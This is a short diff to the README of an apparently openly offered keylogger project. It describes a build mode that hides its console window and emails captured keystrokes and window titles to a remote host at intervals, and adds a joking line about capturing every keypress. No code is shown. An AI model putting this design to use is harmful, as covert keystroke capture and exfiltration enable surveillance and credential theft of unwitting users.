@@ -14,7 +14,7 @@ Features:
   * Compiling with 'readybuild' will compile the executable without 'debugmode' meaning it will attempt to upload logs at the set interval and not print out all keystrokes pressed/windows fetched + it will compile so that the console window is hidden on startup.
 
 WARNING: Might show up as a virus by your antivirus.
-This is due to this projects ability to send stuff via EMAIL (thats how this transmits captured logs to a host computer at a set interval)
+This is due to this projects ability to send stuff via EMAIL (thats how this transmits captured logs to a host computer at a set interval) and ofcourse its abillity to capture all keypresses (lol)
 
 I DO NOT TAKE RESPONSIBILITY FOR HOW THIS IS USED!
 THE PURPOSE OF THIS WAS SIMPLY TO SHOW HOW ITS DONE AND HOW IT WORKS.
